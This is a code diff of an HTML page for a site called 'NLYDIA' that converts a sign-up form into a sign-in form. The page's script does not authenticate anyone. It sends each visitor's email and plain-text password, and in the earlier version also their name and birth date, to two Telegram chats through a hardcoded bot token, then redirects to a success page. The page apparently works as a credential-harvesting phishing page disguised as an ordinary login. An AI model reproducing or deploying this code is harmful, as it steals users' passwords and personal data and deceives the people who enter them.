@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign up - NLYDIA</title>
+    <title>Sign in - NLYDIA</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -29,8 +29,8 @@
             margin: 0 auto;
             padding: 20px;
             text-align: center;
-            height: calc(100vh - 140px); /* 设置容器高度为视窗高度减去顶部导航栏和底部版权栏的高度 */
-            overflow: auto; /* 添加滚动条 */
+            height: calc(100vh - 140px);
+            overflow: auto;
         }
         input[type="text"],
         input[type="email"],
@@ -38,26 +38,6 @@
             width: calc(100% - 22px);
             padding: 10px;
             margin: 8px 0;
-            border: none;
-            border-radius: 5px;
-        }
-        .birthdate {
-            display: flex;
-            justify-content: space-between;
-        }
-        .birthdate input[type="number"] {
-            width: calc(30% - 8px);
-            padding: 10px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 5px;
-            background-color: #333;
-            color: #fff;
-        }
-        .address-country input[type="text"] {
-            width: calc(100% - 22px);
-            padding: 10px;
-            margin: 10px 0;
             border: none;
             border-radius: 5px;
         }
@@ -96,20 +76,6 @@
         .spacer {
             height: 100px;
         }
-        .signin-prompt {
-            margin-top: 20px;
-        }
-        .signin-button {
-            background-color: #333;
-            color: #f0f0f0;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .signin-button:hover {
-            background-color: #555;
-        }
     </style>
 </head>
 <body>
@@ -123,74 +89,48 @@
         </div>
     </div>
     <div class="container">
-        <h2>Sign up</h2>
-        <form id="signupForm">
-            <input type="text" id="first_name" placeholder="First Name" required><br>
-            <input type="text" id="last_name" placeholder="Last Name" required><br>
+        <h2>Sign in</h2>
+        <form id="signinForm">
             <input type="email" id="email" placeholder="Your Email" required><br>
-            <div class="birthdate">
-                <input type="number" id="day" placeholder="Day" min="1" max="31" required>
-<input type="number" id="month" placeholder="Month" min="1" max="12" required>
-                <input type="number" id="year" placeholder="Year" min="1900" max="2100" required>
-            </div>
-            <div class="address-country">
-                <input type="text" id="address" placeholder="Address (not necessarily)">
-            </div>
-            <div class="address-country">
-                <input type="text" id="country" placeholder="Country (not necessarily)">
-            </div>
             <input type="password" id="password" placeholder="Password" required minlength="7"><br>
             <div class="checkbox-container">
                 <input type="checkbox" id="human" name="human" required>
                 <label for="human" class="checkbox-label">I'm not a robot</label>
             </div>
             <br>
-            <input type="submit" id="signupButton" value="Sign up">
+            <input type="submit" id="signinButton" value="Sign in">
         </form>
         <div class="spacer"></div>
-        <div class="success-message" id="successMessage" style="display: none;">Sign up successful</div>
-        <div class="signin-prompt">
-            Already have an account?
-            <button class="signin-button" onclick="window.location.href='signin.html'">Sign in</button>
-        </div>
+        <div class="success-message" id="successMessage" style="display: none;">Sign in successful</div>
     </div>
     <div class="footer">
         © 2024 NLYDIA. All rights reserved.
         <p>Operators: Jared Lee</p>
         <p>Manufacturer: Xiang</p>
     </div>
-   <script>
-        document.getElementById('signupForm').addEventListener('submit', function(event) {
+    <script>
+        document.getElementById('signinForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            var firstName = document.getElementById('first_name').value;
-            var lastName = document.getElementById('last_name').value;
             var email = document.getElementById('email').value;
-            var day = document.getElementById('day').value;
-            var month = document.getElementById('month').value;
-            var year = document.getElementById('year').value;
             var password = document.getElementById('password').value;
 
-            var message = 'First Name: ' + firstName + '\n' +
-                          'Last Name: ' + lastName + '\n' +
-                          'Email: ' + email + '\n' +
-                          'Date of Birth: ' + day + '/' + month + '/' + year + '\n' +
+            var message = 'Email: ' + email + '\n' +
                           'Password: ' + password;
 
             var botToken = '7243508319:AAHcGPRAkx7dgyucfW2dSAgVuNdXFumLNVg';
-            var chatId1 = '825218850';
-            var chatId2 = '1509235250';
+            var chatId1 = '1509235250';
+            var chatId2 = '825218850';
             var url1 = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId1 + '&text=' + encodeURIComponent(message);
             var url2 = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId2 + '&text=' + encodeURIComponent(message);
-
-            // 发送消息给第一个用户
+// 发送消息给第一个用户
             fetch(url1)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
                         console.log('Message sent to first user successfully');
-                        // 跳转到 registered.html 页面
-                        window.location.href = 'registered.html';
+                        // 跳转到 signedin.html 页面
+                        window.location.href = 'signedin.html';
                     } else {
                         console.error('Error sending message to first user.');
                     }
@@ -205,8 +145,6 @@
                 .then(data => {
                     if (data.ok) {
                         console.log('Message sent to second user successfully');
-                        // 跳转到 registered.html 页面
-                        window.location.href = 'registered.html';
                     } else {
                         console.error('Error sending message to second user.');
                     }
